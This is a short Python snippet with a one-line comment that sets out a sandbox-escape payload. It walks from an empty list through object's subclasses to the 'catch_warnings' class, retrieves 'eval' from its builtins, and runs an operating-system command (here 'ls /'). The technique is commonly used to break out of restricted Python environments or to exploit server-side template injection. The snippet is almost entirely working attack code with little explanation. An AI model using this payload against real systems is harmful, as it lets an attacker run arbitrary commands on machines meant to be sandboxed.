# because all types are object in python, we can use inherit relationship to get the module or function we want to execute
[x for x in [].__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0].__init__.__globals__['__builtins__']['eval']("__import__('os').system ('ls /')")
